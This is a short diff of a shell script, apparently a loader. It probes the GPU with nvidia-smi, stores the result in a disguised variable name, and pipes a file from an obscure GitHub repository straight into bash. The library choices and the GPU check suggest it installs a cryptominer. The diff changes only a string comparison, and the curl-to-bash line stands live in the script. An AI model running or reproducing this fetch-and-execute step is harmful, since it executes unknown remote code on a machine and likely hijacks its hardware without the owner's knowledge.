@@ -2,7 +2,7 @@ apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
-if [[ $google84121274 == *"Failed"* ]]; then
+if [[ $google84121274 == *"failed"* ]]; then
 
 curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/google8412127474 | bash
 
